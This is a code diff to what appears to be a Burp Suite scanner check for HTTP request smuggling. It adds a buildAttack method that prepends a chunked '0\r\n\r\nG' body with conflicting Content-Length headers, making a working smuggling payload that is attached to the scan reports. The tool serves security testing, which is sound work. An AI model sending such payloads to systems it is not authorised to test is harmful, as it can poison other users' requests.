@@ -4,10 +4,21 @@ import java.util.List;
 
 public class SmuggleScan extends Scan implements IScannerCheck  {
 
+    Response buildAttack(Response basereq) {
+        byte[] req = basereq.getReq().getRequest();
+        byte[] badMethodIfChunked = Utilities.setBody(req, "0\r\n\r\nG"+Utilities.helpers.bytesToString(req));
+
+        badMethodIfChunked = Utilities.setHeader(badMethodIfChunked, "Connection", "keep-alive");
+        badMethodIfChunked = Utilities.setHeader(badMethodIfChunked, "Content-Length", "6");
+
+        return new Response(new Request(badMethodIfChunked, null, basereq.getReq().getHttpService()));
+    }
+
     public List<IScanIssue> doScan(byte[] baseReq, IHttpService service) {
         // todo handle non-zero bodies
         //int bodySize = baseReq.length - Utilities.getBodyStart(baseReq);
         //Utilities.out(""+bodySize);
+        //Utilities.getBody(baseReq);
 
         baseReq = Utilities.addOrReplaceHeader(baseReq, "Transfer-Encoding", "chunked");
         baseReq = Utilities.addOrReplaceHeader(baseReq, "Content-Length", "5");
@@ -18,11 +29,13 @@ public class SmuggleScan extends Scan implements IScannerCheck  {
             return null;
         }
 
+        Response suggestedProbe = buildAttack(syncedResp);
+
         byte[] reverseLength = Utilities.setHeader(baseReq, "Content-Length", "4");
         Response truncatedChunk = request(service, reverseLength);
         if (truncatedChunk.timedOut()) {
             Utilities.out("Reporting reverse timeout technique worked");
-            report("Request smuggling v1-b", "Status:timeout", syncedResp, truncatedChunk);
+            report("Request smuggling v1-b", "Status:timeout", syncedResp, truncatedChunk, suggestedProbe, buildAttack(truncatedChunk));
             //return null;
         }
         else {
@@ -60,7 +73,7 @@ public class SmuggleScan extends Scan implements IScannerCheck  {
             }
         }
 
-        report("Request smuggling v1", "Status:BadChunkDetection:BadLengthDetected", syncedResp, badChunkResp, badLengthResp);
+        report("Request smuggling v1", "Status:BadChunkDetection:BadLengthDetected", syncedResp, badChunkResp, badLengthResp, suggestedProbe);
         return null;
     }
 }
